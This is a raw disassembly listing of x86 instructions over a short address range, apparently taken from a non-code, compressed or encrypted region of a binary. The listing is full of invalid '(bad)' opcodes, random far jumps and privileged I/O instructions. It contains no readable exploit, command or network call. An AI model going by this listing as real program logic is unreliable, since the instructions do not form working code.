  41b525:	addr16 mov ds:0x89bf,al
  41b529:	rcr    BYTE PTR [ebp+0x76],1
  41b52c:	pushf  
  41b52d:	(bad)  
  41b52f:	hlt    
  41b530:	mov    edx,0xecf80947
  41b535:	lock pop esp
  41b537:	xlat   BYTE PTR ds:[ebx]
  41b538:	ja     0x41b50e
  41b53a:	xchg   ecx,eax
  41b53b:	js     0x41b523
  41b53d:	push   esp
  41b53e:	inc    esi
  41b53f:	jae    0x41b535
  41b541:	jae    0x41b57d
  41b543:	mov    ds:0xac1d930,al
  41b548:	repz mov al,0xd4
  41b54b:	sub    BYTE PTR [esi],dl
  41b54d:	add    al,0x23
  41b54f:	mul    DWORD PTR [eax+edx*1+0x24bcca90]
  41b556:	pop    edi
  41b557:	xchg   esi,eax
  41b558:	cli    
  41b559:	mov    edi,eax
  41b55b:	jg     0x41b566
  41b55d:	(bad)  
  41b55e:	cmp    eax,DWORD PTR [edx-0x44cf89e1]
  41b564:	xor    ah,0xa5
  41b567:	push   esp
  41b568:	mov    dh,0xb4
  41b56a:	inc    edx
  41b56b:	int    0x94
  41b56d:	xchg   dl,bh
  41b56f:	fidiv  DWORD PTR [esi+esi*4]
  41b572:	sub    eax,0x13229759
  41b577:	les    ebp,FWORD PTR [edi+ebp*4-0x297e6562]
  41b57e:	retf   0x10b1
  41b581:	pushf  
  41b582:	mov    ebp,0xa1910634
  41b587:	dec    esp
  41b588:	add    al,0x9f
  41b58a:	push   ds
  41b58b:	fwait
  41b58c:	push   es
  41b58d:	mov    esi,0xd124bfed
  41b592:	aaa    
  41b593:	dec    ebx
  41b594:	out    dx,al
  41b595:	repz dec ebx
  41b597:	xchg   ebx,eax
  41b598:	mov    ds,WORD PTR [ebx+ebp*4-0x33]
  41b59c:	xchg   edi,eax
  41b59d:	and    eax,0xd4b9682e
  41b5a2:	int3   
  41b5a3:	rol    DWORD PTR [eax+0x4e],cl
  41b5a6:	inc    BYTE PTR [esp+eiz*4]
  41b5a9:	jle    0x41b5c3
  41b5ab:	xchg   edx,eax
  41b5ac:	ins    BYTE PTR es:[edi],dx
  41b5ad:	test   DWORD PTR [edx+0x6d26c6f6],esp
  41b5b3:	sbb    eax,0x5bcfeace
  41b5b8:	cli    
  41b5b9:	xchg   DWORD PTR ds:0x6749386f,edi
  41b5bf:	cmp    ecx,DWORD PTR [eax]
  41b5c1:	cmc    
  41b5c2:	inc    edi
  41b5c3:	cmp    al,0xd3
  41b5c5:	loop   0x41b5a9
  41b5c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5c8:	ins    DWORD PTR es:[edi],dx
  41b5c9:	pop    es
  41b5ca:	push   ss
  41b5cb:	add    bh,BYTE PTR [ecx+0x53b3bd4e]
  41b5d1:	jl     0x41b55c
  41b5d3:	int3   
  41b5d4:	dec    edx
  41b5d5:	jb     0x41b62c
  41b5d7:	mov    cl,0x7e
  41b5d9:	out    0x1c,al
  41b5db:	leave  
  41b5dc:	dec    esp
  41b5dd:	idiv   DWORD PTR [ebx-0x445d6438]
  41b5e3:	icebp  
  41b5e4:	(bad)  
  41b5e5:	outs   dx,DWORD PTR ds:[esi]
  41b5e6:	outs   dx,BYTE PTR ds:[esi]
  41b5e7:	mov    ebx,cs
  41b5e9:	(bad)  
  41b5ea:	adc    al,0x0
  41b5ec:	data16 mov bl,0x85
  41b5ef:	in     al,dx
  41b5f0:	add    al,0xc8
  41b5f2:	mov    BYTE PTR [ebp+0x7d],al
  41b5f5:	sbb    DWORD PTR [edi],ecx
  41b5f7:	or     edi,DWORD PTR [esi-0x77]
  41b5fa:	gs jo  0x41b5da
  41b5fd:	push   edx
  41b5fe:	loope  0x41b635
  41b600:	iret   
  41b601:	shl    DWORD PTR [edi-0x19],0x12
  41b605:	pop    es
  41b606:	mov    dl,0x9d
  41b608:	cli    
  41b609:	lahf   
  41b60a:	clc    
  41b60b:	sar    BYTE PTR [ebx+edx*4],0xa2
  41b60f:	scas   eax,DWORD PTR es:[edi]
  41b610:	aas    
  41b611:	mov    al,0xda
  41b613:	retf   0x9905
  41b616:	(bad)
  41b61a:	mov    cl,0xe2
  41b61c:	retf   0x96ff
  41b61f:	pop    eax
  41b620:	pop    edi
  41b621:	jb     0x41b5f7
  41b623:	sbb    ch,BYTE PTR [edi-0x3f]
  41b626:	shl    BYTE PTR [edx+ebx*1],1
  41b629:	setno  BYTE PTR [esi]
  41b62c:	inc    edx
  41b62d:	dec    edi
  41b62e:	and    BYTE PTR [ebx-0x2c],dl
  41b631:	and    ch,BYTE PTR [eax+0x36]
  41b634:	stos   BYTE PTR es:[edi],al
  41b635:	jg     0x41b64b
  41b637:	and    ch,BYTE PTR [edx+0x4db485b5]
  41b63d:	and    al,0xac
  41b63f:	ret    
  41b640:	and    eax,0x50556cb6
  41b645:	idiv   BYTE PTR [edi-0x21f75719]
  41b64b:	xchg   esp,eax
  41b64c:	mov    al,ds:0xc90ba5b2
  41b651:	push   esp
  41b652:	inc    esi
  41b653:	imul   edi,DWORD PTR [edx+ecx*4+0x5d4cd2f4],0xffffffa1
  41b65b:	pop    eax
  41b65c:	mov    edx,0xf92ca352
  41b661:	je     0x41b630
  41b663:	mov    eax,ds:0x93a20636
  41b668:	cmp    esp,DWORD PTR [ecx+0x2e5f4e41]
  41b66e:	nop
  41b66f:	add    ebp,edi
  41b671:	pop    ecx
  41b672:	nop
  41b673:	mov    ds:0x228ccafa,al
  41b678:	repnz and al,0xc2
  41b67b:	lods   al,BYTE PTR ds:[esi]
  41b67c:	lods   eax,DWORD PTR ds:[esi]
  41b67d:	push   edi
  41b67e:	mov    ds:0xfe7e7f3e,eax
  41b683:	inc    ebp
  41b684:	call   0xb2cf:0x702ce527
  41b68b:	(bad)  
  41b68c:	cmp    BYTE PTR [ecx-0x32],dh
  41b68f:	pop    ebp
  41b690:	sub    al,ch
  41b692:	xchg   bl,ah
  41b694:	or     bh,ah
  41b696:	in     eax,0x6b
  41b698:	lock dec ebx
  41b69a:	not    BYTE PTR [edx+0x3f8bbc97]
  41b6a0:	or     al,BYTE PTR [ecx-0xa]
  41b6a3:	fcom   QWORD PTR [ebx]
  41b6a5:	fs mov esi,0x3fcfa793
  41b6ab:	mov    ebx,0xea8a5b95
  41b6b0:	(bad)  
  41b6b1:	test   al,0x25
  41b6b3:	mov    edx,edi
  41b6b5:	cmc    
  41b6b6:	popa   
  41b6b7:	mov    bl,0xa2
  41b6b9:	and    al,0x65
  41b6bb:	lfs    ebp,FWORD PTR [ebx+0x573ca8b5]
  41b6c2:	dec    edi
  41b6c3:	mov    dl,0x87
  41b6c5:	cld    
  41b6c6:	push   0xffffffbb
  41b6c8:	push   0xa99fba3f
  41b6cd:	popf   
  41b6ce:	sub    BYTE PTR [eax],0xca
  41b6d1:	lea    ebx,[ebp-0x16]
  41b6d4:	jge    0x41b6aa
  41b6d6:	adc    BYTE PTR [eax],0x9e
  41b6d9:	inc    ecx
  41b6da:	xchg   ebx,eax
  41b6db:	dec    edi
  41b6dc:	pop    ecx
  41b6dd:	(bad)  
  41b6de:	loopne 0x41b6de
  41b6e0:	mov    al,0x6a
  41b6e2:	in     eax,dx
  41b6e3:	(bad)  
  41b6e4:	add    dh,BYTE PTR [ecx+0x2b7308b2]
  41b6ea:	fisttp WORD PTR [edi-0x66]
  41b6ed:	mov    BYTE PTR [esi],ch
  41b6ef:	inc    edx
  41b6f0:	popa   
  41b6f1:	arpl   WORD PTR [eax-0x8],bx
  41b6f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6f5:	jmp    0x61a5ae8a
  41b6fa:	shr    BYTE PTR [ecx+0xd159f2],cl
  41b700:	in     al,0xc0
  41b702:	js     0x41b694
  41b704:	jle    0x41b73d
  41b706:	cmp    DWORD PTR [ecx+0x5f],ebp
  41b709:	add    ebp,edi
  41b70b:	mov    ds:0xa822d49e,eax
  41b710:	pop    esp
  41b711:	outs   dx,BYTE PTR ds:[esi]
  41b712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b713:	fwait
  41b714:	jmp    0x190bb2eb
  41b719:	mov    dl,0xf6
  41b71b:	das    
  41b71c:	xor    esp,ebx
  41b71e:	and    bh,BYTE PTR [ebx-0x20]
  41b721:	add    edi,DWORD PTR [ebx+0x2]
  41b724:	jne    0x41b71c
  41b726:	cs popa 
  41b728:	sbb    cl,ah
  41b72a:	jo     0x41b715
  41b72c:	inc    edx
  41b72d:	clc    
  41b72e:	sahf   
  41b72f:	xchg   ebx,eax
  41b730:	jae    0x41b71d
  41b732:	sub    DWORD PTR [esi-0x80],ebp
  41b735:	add    dh,BYTE PTR [eax+edx*4-0x43]
  41b739:	sub    al,0x60
  41b73b:	sub    al,0xe
  41b73d:	test   eax,0x7bd4dcf5
  41b742:	loop   0x41b76e
  41b744:	lods   al,BYTE PTR ds:[esi]
  41b745:	aad    0x5
  41b747:	enter  0xcc6d,0xbd
  41b74b:	push   cs
  41b74c:	mov    eax,0xf67248cf
  41b751:	popf   
  41b752:	and    al,BYTE PTR [ebp-0x7defc592]
  41b758:	pop    esp
  41b759:	icebp  
  41b75a:	das    
  41b75b:	dec    edx
  41b75c:	or     DWORD PTR [ebx-0x5b],0x78
  41b760:	push   esi
  41b761:	call   0x6f406b15
  41b766:	loopne 0x41b7cf
  41b768:	mov    cl,0x48
  41b76a:	cmp    bh,BYTE PTR [edx-0x53cc9a65]
  41b770:	imul   eax,DWORD PTR [eax],0x53
  41b773:	jl     0x41b72d
  41b775:	pop    eax
  41b776:	shr    BYTE PTR [ecx-0x154be247],0x1c
  41b77d:	and    eax,0xcf05daad
  41b782:	shr    BYTE PTR ds:0x581487d6,1
  41b788:	mov    bl,BYTE PTR [esi+0x2ef7e9fb]
  41b78e:	jbe    0x41b710
  41b790:	pop    ss
  41b791:	add    dh,BYTE PTR [ecx]
  41b793:	ins    BYTE PTR es:[edi],dx
  41b794:	and    ebp,DWORD PTR [esi]
  41b796:	jg     0x41b79b
  41b798:	adc    eax,0xe3645735
  41b79d:	push   cs
  41b79e:	sar    edx,0xaa
  41b7a1:	pop    ss
  41b7a2:	in     al,dx
  41b7a3:	into   
  41b7a4:	data16 mov ?,WORD PTR [ebx-0x129945a7]
  41b7ab:	jge    0x41b73a
  41b7ad:	mov    eax,0xd10753a4
  41b7b2:	scas   eax,DWORD PTR es:[edi]
  41b7b3:	(bad)  
  41b7b4:	loope  0x41b828
  41b7b6:	jb     0x41b78e
  41b7b8:	xor    DWORD PTR [ecx+ebp*1-0xb],esp
  41b7bc:	pop    edi
  41b7bd:	js     0x41b81e
  41b7bf:	lahf   
  41b7c0:	fld    TBYTE PTR [edx-0x6a]
  41b7c3:	out    0xe4,al
  41b7c5:	jge    0x41b831
  41b7c7:	or     al,0xb0
  41b7c9:	dec    ecx
  41b7ca:	jno    0x41b7f9
  41b7cc:	push   ebp
  41b7cd:	add    al,0xbd
  41b7cf:	sbb    BYTE PTR [edi],ch
  41b7d1:	je     0x41b7a9
  41b7d3:	out    0x6b,eax
  41b7d5:	cmp    BYTE PTR [esi+0x7eb526f7],dh
  41b7db:	cmc    
  41b7dc:	test   eax,0xed25a91a
  41b7e1:	push   edi
  41b7e2:	cmp    DWORD PTR [esi+eiz*8],esi
  41b7e5:	inc    eax
  41b7e6:	push   ecx
  41b7e7:	fcmovb st,st(7)
  41b7e9:	inc    ecx
  41b7ea:	cmp    eax,DWORD PTR [edi]
  41b7ec:	ret    
  41b7ed:	adc    al,0xd6
  41b7ef:	leave  
  41b7f0:	ins    BYTE PTR es:[edi],dx
  41b7f1:	add    DWORD PTR [eax],ebx
  41b7f3:	iret   
  41b7f4:	mov    bh,0xa
  41b7f6:	mov    ds:0x4ca76976,eax
  41b7fb:	scas   eax,DWORD PTR es:[edi]
  41b7fc:	jb     0x41b7f2
  41b7fe:	rol    dh,0xb1
  41b801:	stc    
  41b802:	dec    esp
  41b803:	imul   BYTE PTR ds:0x85df993f
  41b809:	push   ecx
  41b80a:	mov    ah,0x75
  41b80c:	jp     0x41b86d
  41b80e:	push   edi
  41b80f:	ja     0x41b818
  41b811:	sub    eax,0xcccc0ed7
  41b816:	js     0x41b86a
  41b818:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b819:	adc    eax,0x440e6f64
  41b81e:	xchg   DWORD PTR [ebp-0x39c469fa],esp
  41b824:	ret    
  41b825:	xor    ecx,DWORD PTR [eax+0x59]
  41b828:	and    al,0xdb
  41b82a:	lock dec BYTE PTR [edi]
  41b82d:	push   esi
  41b82e:	or     edi,DWORD PTR ds:0xfffa5d4d
  41b834:	retf   
  41b835:	lahf   
  41b836:	jp     0x41b829
  41b838:	sub    BYTE PTR [esi+0x1e],0xe1
  41b83c:	mov    eax,0x59facbbb
  41b841:	and    esp,0xffffffdd
  41b844:	pusha  
  41b845:	jg     0x41b846
  41b847:	rcr    DWORD PTR [ebx+ecx*2],1
  41b84a:	push   ebp
  41b84b:	popf   
  41b84c:	add    eax,0x13dcf644
  41b851:	fcom   QWORD PTR [ebx-0x30d2ab12]
  41b857:	and    al,0x7f
  41b859:	cwde   
  41b85a:	inc    edi
  41b85b:	enter  0x1a12,0x22
  41b85f:	jle    0x41b80c
  41b861:	dec    edx
  41b862:	cmp    eax,0x12bf0fa5
  41b867:	stos   BYTE PTR es:[edi],al
  41b868:	fwait
  41b869:	(bad)  
  41b86a:	stc    
  41b86b:	sub    ch,dl
  41b86d:	xchg   ebp,eax
  41b86e:	sti    
  41b86f:	push   ebp
  41b870:	adc    eax,0x55753108
  41b875:	pop    edx
  41b876:	dec    esp
  41b877:	(bad)  
  41b879:	lahf   
  41b87a:	push   0x570a94af
  41b87f:	leave  
  41b880:	out    dx,al
  41b881:	mov    al,ds:0xcdeb3bc4
  41b886:	and    DWORD PTR [ebp-0x76],eax
  41b889:	jb     0x41b821
  41b88b:	ja     0x41b86e
  41b88d:	xchg   DWORD PTR [ebx+0x1d24ce03],edx
  41b893:	sar    DWORD PTR [eax-0x429c18c5],0xd8
  41b89a:	xor    ebx,DWORD PTR [ebx+0x2c]
  41b89d:	(bad)  
  41b89f:	push   0xffffffc9
  41b8a1:	repz test eax,0x36ea5d3f
  41b8a7:	sbb    esp,DWORD PTR [eax+0x6b]
  41b8aa:	lahf   
  41b8ab:	mov    al,ds:0x6a2e274
  41b8b0:	cs cmp bh,ch
  41b8b3:	xchg   edi,eax
  41b8b4:	sub    eax,0x2da7d666
  41b8b9:	ret    0xa600
  41b8bc:	out    dx,al
  41b8bd:	pop    esi
  41b8be:	out    dx,al
  41b8bf:	enter  0x9f81,0x55
  41b8c3:	fs (bad) 
  41b8c5:	(bad)  
  41b8c6:	cmp    ebx,ebx
  41b8c8:	cmp    ecx,DWORD PTR ds:[edi+0x40]
  41b8cc:	fiadd  DWORD PTR [ebp+0x2ad4782]
  41b8d2:	mov    ?,esi
  41b8d4:	stos   BYTE PTR es:[edi],al
  41b8d5:	push   esi
  41b8d6:	adc    BYTE PTR [eax-0x4a],0xc
  41b8da:	ja     0x41b8ee
  41b8dc:	xor    DWORD PTR [ecx+0x52],0x38
  41b8e0:	pop    ecx
  41b8e1:	xchg   ecx,eax
  41b8e2:	xor    eax,0x25c9bfbd
  41b8e7:	ret    
  41b8e8:	and    DWORD PTR [edi+0x49ea0a79],esp
  41b8ee:	outs   dx,DWORD PTR ds:[esi]
  41b8ef:	sub    eax,0xcfec80f
  41b8f4:	stc    
  41b8f5:	daa    
  41b8f6:	inc    esp
  41b8f7:	and    eax,0x3d80d2b9
  41b8fc:	add    edx,ebx
  41b8fe:	cmp    al,0x84
  41b900:	shr    DWORD PTR fs:[edx-0x3a4e1322],cl
  41b907:	pop    ecx
  41b908:	ret    0x403e
  41b90b:	test   al,0xb2
  41b90d:	scas   eax,DWORD PTR es:[edi]
  41b90e:	pop    edx
  41b90f:	or     BYTE PTR [eax-0x3dede6ee],dl
  41b915:	push   ecx
  41b916:	push   esi
  41b917:	test   eax,0xb8cbc49a
  41b91c:	pop    esi
  41b91d:	xchg   edx,eax
  41b91e:	mov    edx,0x13395cba
  41b923:	mov    eax,0x38d0e48b
  41b928:	mov    al,ds:0x81a37e52
  41b92d:	sar    BYTE PTR [ebx+0x3c349ec8],1
  41b933:	arpl   WORD PTR [ecx],si
  41b935:	pop    ebx
  41b936:	mov    DWORD PTR [eax-0x69],ecx
  41b939:	dec    edx
  41b93a:	push   cs
  41b93b:	js     0x41b920
  41b93d:	sub    edi,DWORD PTR [edi]
  41b93f:	dec    edx
  41b940:	inc    ebp
  41b941:	or     eax,0x82b703a3
  41b946:	xor    eax,0x5dccb18f
  41b94b:	xchg   DWORD PTR [ecx],esi
  41b94d:	test   DWORD PTR [ecx],ecx
  41b94f:	inc    eax
  41b950:	sbb    al,0x40
  41b952:	mov    ecx,0x8db41efe
  41b957:	add    cl,dl
  41b959:	or     al,0x7c
  41b95b:	and    BYTE PTR [edi+0x30e6d3fe],ch
  41b961:	or     BYTE PTR [ecx+0x50],dl
  41b964:	jb     0x41b92d
  41b966:	repnz loope 0x41b9bc
  41b969:	pop    ecx
  41b96a:	push   ds
  41b96b:	cmp    eax,0x7af5e714
  41b970:	xlat   BYTE PTR ds:[ebx]
  41b971:	xchg   ebp,eax
  41b972:	and    eax,0xfbe2e293
  41b977:	lods   eax,DWORD PTR ds:[esi]
  41b978:	out    0x10,al
  41b97a:	and    dl,BYTE PTR [ecx-0x52b029a3]
  41b980:	cmp    ch,cl
  41b982:	ret    0xb1b5
  41b985:	push   edi
  41b986:	pop    ds
  41b987:	sub    BYTE PTR [eax+0x2577ed25],ah
  41b98d:	popa   
  41b98e:	cmp    eax,0xf5be5c35
  41b993:	in     eax,0x1c
  41b995:	retf   0x9be5
  41b998:	sub    al,bl
  41b99a:	frstor [ebx]
  41b99c:	(bad)  
  41b99d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b99e:	push   0xd56550c8
  41b9a3:	ins    DWORD PTR es:[edi],dx
  41b9a4:	sahf   
  41b9a5:	pusha  
  41b9a6:	cmp    al,0x71
  41b9a8:	adc    bh,BYTE PTR [eax]
  41b9aa:	ficomp WORD PTR [edi+0x71]
  41b9ad:	pop    edi
  41b9ae:	jg     0x41b988
  41b9b0:	add    bh,dh
  41b9b2:	xchg   ebx,eax
  41b9b3:	sub    eax,DWORD PTR [eax+0x23]
  41b9b6:	ss add al,0xf0
  41b9b9:	ret    0x13b5
  41b9bc:	out    0x4b,eax
  41b9be:	mov    edx,0x711f9a9f
  41b9c3:	idiv   DWORD PTR [esi+0x765875c6]
  41b9c9:	pop    ss
  41b9ca:	push   0xa421780e
  41b9cf:	inc    ecx
  41b9d0:	pop    esp
  41b9d1:	ret    
  41b9d2:	xchg   ebp,eax
  41b9d3:	jmp    0x41ba05
  41b9d5:	xor    dh,BYTE PTR ds:0xf53fb408
  41b9db:	stos   BYTE PTR es:[edi],al
  41b9dc:	xor    DWORD PTR gs:[edi-0x42],edi
  41b9e0:	retf   0x65c4
  41b9e3:	out    0xf8,al
  41b9e5:	ins    DWORD PTR es:[edi],dx
  41b9e6:	pop    ds
  41b9e7:	and    edi,0xe19cb8b9
  41b9ed:	jo     0x41b9ca
  41b9ef:	xor    eax,0x6b14465c
  41b9f4:	sbb    dh,BYTE PTR [ecx-0x403da515]
  41b9fa:	xchg   ebp,eax
  41b9fb:	cmp    eax,0x2d34016
  41ba00:	sub    al,0x2f
  41ba02:	(bad)  
  41ba03:	aad    0xf4
  41ba05:	pop    edx
  41ba06:	add    al,0x38
  41ba08:	scas   al,BYTE PTR es:[edi]
  41ba09:	imul   edi,DWORD PTR [edx-0x62],0x928b456c
  41ba10:	push   esi
  41ba11:	adc    BYTE PTR [ebx],ah
  41ba13:	in     al,0xfc
  41ba15:	mov    BYTE PTR [ebx+0x6c2775f],bh
  41ba1b:	(bad)  
  41ba1d:	jl     0x41ba0e
  41ba1f:	sub    eax,0xe25356db
  41ba24:	inc    esp
  41ba25:	lahf   
  41ba26:	leave  
  41ba27:	shl    BYTE PTR [esp+ebp*2],0x1d
  41ba2b:	xchg   edx,eax
  41ba2c:	lods   eax,DWORD PTR ds:[esi]
  41ba2d:	cmp    DWORD PTR [ecx+0x3aa163c1],ebp
  41ba33:	dec    ebx
  41ba34:	pop    ebx
  41ba35:	jmp    0x8bec:0x26a3eff8
  41ba3c:	add    BYTE PTR [eax+0x30d2e275],0xe0
  41ba43:	mov    ecx,0x91534ee1
  41ba48:	jge    0x41ba3b
  41ba4a:	ins    BYTE PTR es:[edi],dx
  41ba4b:	mul    DWORD PTR [edx+0x26]
  41ba4e:	fsqrt  
  41ba50:	inc    edx
  41ba51:	pusha  
  41ba52:	adc    al,0x38
  41ba54:	lahf   
  41ba55:	retf   0xef91
  41ba58:	popf   
  41ba59:	loop   0x41ba8b
  41ba5b:	mov    al,ds:0x5a909297
  41ba60:	xor    cl,BYTE PTR ds:0x4a679fb8
  41ba66:	shr    BYTE PTR [edx+esi*1-0x4f],cl
  41ba6a:	cmovae ecx,DWORD PTR [edx-0x5b]
  41ba6e:	fimul  WORD PTR [esi+0x27]
  41ba71:	shr    DWORD PTR [ebx],1
  41ba73:	rcl    DWORD PTR [ebp-0x1d],1
  41ba76:	retf   0xbc06
  41ba79:	mov    al,0xd3
  41ba7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba7c:	aad    0xf7
  41ba7e:	push   eax
  41ba7f:	xchg   ebp,eax
  41ba80:	inc    edi
  41ba81:	push   edx
  41ba82:	mov    eax,0x88a9eba6
  41ba87:	out    dx,eax
  41ba88:	xchg   edx,eax
  41ba89:	jl     0x41ba58
  41ba8b:	je     0x41ba0d
  41ba8d:	sub    al,BYTE PTR [eax-0x7676c1a1]
  41ba93:	xor    eax,DWORD PTR [ecx+ebx*2-0x3b28212]
  41ba9a:	adc    edi,0xffffffda
  41ba9d:	(bad)  
  41ba9f:	mov    dl,0x56
  41baa1:	retf   0x4b01
  41baa4:	mov    ebp,0x908c240b
  41baa9:	cmp    DWORD PTR [ecx],eax
  41baab:	gs dec edx
  41baad:	cmp    BYTE PTR [ecx+ebp*8],bh
  41bab0:	mov    BYTE PTR [ecx+edi*2+0x43],ch
  41bab4:	push   es
  41bab5:	inc    esi
  41bab6:	and    eax,0x85729e42
  41babb:	in     eax,dx
  41babc:	mov    ebp,0x1a166cfb
  41bac1:	xchg   edx,edx
  41bac3:	sbb    al,0x29
  41bac5:	push   ebp
  41bac6:	inc    ebp
  41bac7:	inc    esi
  41bac8:	test   eax,0x4411f047
  41bacd:	sbb    bh,BYTE PTR [ebx+edi*4-0x1e]
  41bad1:	jge    0x41baa0
  41bad3:	dec    edx
  41bad4:	mov    ecx,ds
  41bad6:	mov    ds:0xd4c4646d,eax
  41badb:	xor    al,0x41
  41badd:	sub    al,0x60
  41badf:	lock jl 0x41bac1
  41bae2:	mov    eax,0x744b835
  41bae7:	jmp    0x3265:0x19f61033
  41baee:	inc    eax
  41baef:	into   
  41baf0:	pop    edi
  41baf1:	stc    
  41baf2:	fsubr  st(7),st
  41baf4:	add    DWORD PTR [edi],ebp
  41baf6:	cdq    
  41baf7:	xor    DWORD PTR [esi+0xc09ac86],0x67
  41bafe:	lahf   
  41baff:	pop    ss
  41bb00:	push   ss
  41bb01:	xor    BYTE PTR [eax-0x51],ch
  41bb04:	mov    ah,0x9b
  41bb06:	xchg   edx,eax
  41bb07:	inc    ebp
  41bb08:	jp     0x41bb66
  41bb0a:	pop    ss
  41bb0b:	in     al,dx
  41bb0c:	jb     0x41bb2c
  41bb0e:	test   DWORD PTR [ebx+0x3b],0x6b599111
  41bb15:	add    dl,bh
  41bb17:	mov    esi,0xca4a8dbc
  41bb1c:	cs (bad) 
  41bb1e:	sub    dl,BYTE PTR [edx+0x51507b1b]
  41bb24:	or     DWORD PTR [ecx-0x57e7d1b1],ebx
  41bb2a:	inc    ebp
  41bb2b:	leave  
  41bb2c:	inc    cx
  41bb2e:	test   bl,cl
  41bb30:	es icebp 
  41bb32:	outs   dx,DWORD PTR ds:[esi]
  41bb33:	pop    ecx
  41bb34:	enter  0x44f7,0x88
  41bb38:	push   ds
  41bb39:	popf   
  41bb3a:	(bad)  
  41bb3b:	retf   
  41bb3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb3d:	mov    ah,0xc3
  41bb3f:	pop    eax
  41bb40:	lods   eax,DWORD PTR ds:[esi]
  41bb41:	into   
  41bb42:	xlat   BYTE PTR ds:[ebx]
  41bb43:	scas   al,BYTE PTR es:[edi]
  41bb44:	inc    edx
  41bb45:	imul   esi,eax,0xa789ba87
  41bb4b:	dec    eax
  41bb4c:	rcl    DWORD PTR [ebx-0x1bd8ecf0],cl
  41bb52:	ret    0xa382
  41bb55:	dec    edx
  41bb56:	xchg   esi,eax
  41bb57:	and    BYTE PTR [edi-0x23],bh
  41bb5a:	sub    edx,esi
  41bb5c:	neg    BYTE PTR [edx]
  41bb5e:	dec    ebx
  41bb5f:	and    al,ah
  41bb61:	mov    al,ds:0xfe8eaa83
  41bb66:	pusha  
  41bb67:	int3   
  41bb68:	into   
  41bb69:	dec    ebp
  41bb6a:	adc    al,0x31
  41bb6c:	add    BYTE PTR [eax],ch
  41bb6e:	adc    al,0x47
  41bb70:	xor    cx,cx
  41bb73:	pop    ds
  41bb74:	mov    DWORD PTR [esi],eax
  41bb76:	ja     0x41bafc
  41bb78:	and    edx,DWORD PTR [esi-0x43a03677]
  41bb7e:	sub    DWORD PTR [ecx+0x67a8ac00],eax
  41bb84:	enter  0x7268,0xd9
  41bb88:	mov    ds:0x702a3cd2,al
  41bb8d:	sahf   
  41bb8e:	mov    edi,0x1bb91be4
  41bb93:	xchg   ebx,eax
  41bb94:	dec    edx
  41bb95:	test   DWORD PTR [eax-0x1a],0xc0ab0f7b
  41bb9c:	cld    
  41bb9d:	ret    0xacae
  41bba0:	sbb    DWORD PTR [ebx-0x3f],edx
  41bba3:	ins    BYTE PTR es:[edi],dx
  41bba4:	fwait
  41bba5:	and    dl,al
  41bba7:	jae    0x41bbf6
  41bba9:	repz pusha 
  41bbab:	loope  0x41bbf7
  41bbad:	mov    bh,0xa6
  41bbaf:	jno    0x41bba6
  41bbb1:	in     al,0x73
  41bbb3:	mov    ecx,0x38ba2600
  41bbb8:	xchg   DWORD PTR [ebp-0x7058407b],eax
  41bbbe:	jo     0x41bc0f
  41bbc0:	jns    0x41bbaf
  41bbc2:	addr16 out dx,al
  41bbc4:	gs cs pop ss
  41bbc7:	dec    esi
  41bbc8:	ins    DWORD PTR es:[edi],dx
  41bbc9:	(bad)  
  41bbca:	mov    WORD PTR [edx+0x6e],es
  41bbcd:	pop    ecx
  41bbce:	shl    DWORD PTR ds:0xff03e71e,1
  41bbd4:	fsub   DWORD PTR [ecx-0x7a706c8a]
  41bbda:	and    cl,BYTE PTR [edx-0x14]
  41bbdd:	xlat   BYTE PTR ds:[ebx]
  41bbde:	lea    eax,[edx-0x34e509]
  41bbe4:	add    edx,ebx
  41bbe6:	inc    ebp
  41bbe7:	push   esi
  41bbe8:	sar    bh,1
  41bbea:	mov    esp,0x3832d888
  41bbef:	test   eax,0x819a1635
  41bbf4:	xchg   esi,eax
  41bbf5:	xlat   BYTE PTR ds:[ebx]
  41bbf6:	sub    DWORD PTR [eax],esp
  41bbf8:	cmp    edx,esp
  41bbfa:	sar    cl,1
  41bbfc:	jae    0x41bc48
  41bbfe:	les    esi,FWORD PTR fs:[ecx+0x8]
  41bc02:	fdiv   DWORD PTR [edx+esi*8]
  41bc05:	call   0xd35b:0x9ca9fc49
  41bc0c:	add    eax,0x42a1f8d4
  41bc11:	loopne 0x41bbe9
  41bc13:	jge    0x41bbba
  41bc15:	int    0x47
  41bc17:	mov    DWORD PTR [edx],ebx
  41bc19:	fld    QWORD PTR [edi]
  41bc1b:	and    dh,bh
  41bc1d:	sbb    BYTE PTR [ecx-0x2841e06d],bh
  41bc23:	stos   BYTE PTR es:[edi],al
  41bc24:	xchg   esp,eax
  41bc25:	loopne 0x41bc7a
  41bc27:	mov    ds:0x1e3aef59,eax
  41bc2c:	(bad)  
  41bc2d:	ds dec esp
  41bc2f:	xchg   esp,eax
  41bc30:	inc    ecx
  41bc31:	pushf  
  41bc32:	int3   
  41bc33:	cmp    al,0xc5
  41bc35:	push   ebx
  41bc36:	aad    0x95
  41bc38:	push   esp
  41bc39:	iret   
  41bc3a:	mov    ecx,0xb84b87d2
  41bc3f:	pop    edi
  41bc40:	lea    ebp,[ebx+eiz*8+0x4559a7d7]
  41bc47:	jl     0x41bc1b
  41bc49:	mov    bl,0x80
  41bc4b:	inc    edi
  41bc4c:	sbb    eax,DWORD PTR [ecx-0x2014662f]
  41bc52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc53:	int3   
  41bc54:	ins    BYTE PTR es:[edi],dx
  41bc55:	xchg   BYTE PTR [edi+edi*1+0x2be6333a],bl
  41bc5c:	add    al,0x38
  41bc5e:	dec    ecx
  41bc5f:	or     esp,DWORD PTR [ecx+eax*1]
  41bc62:	int3   
  41bc63:	cdq    
  41bc64:	adc    ebp,DWORD PTR [edx]
  41bc66:	xchg   ebp,eax
  41bc67:	xor    BYTE PTR [edi+0x26bf7213],cl
  41bc6d:	imul   eax,ecx,0xfffffff2
  41bc70:	dec    edx
  41bc71:	adc    ch,BYTE PTR [ebx+0x6a]
  41bc74:	mov    al,ds:0xa8b07761
  41bc79:	mov    bh,BYTE PTR [ecx-0x20ee3d95]
  41bc7f:	jae    0x41bc71
  41bc81:	push   ebx
  41bc82:	fcomp  QWORD PTR [esi]
  41bc84:	(bad)  
  41bc85:	jl     0x41bc56
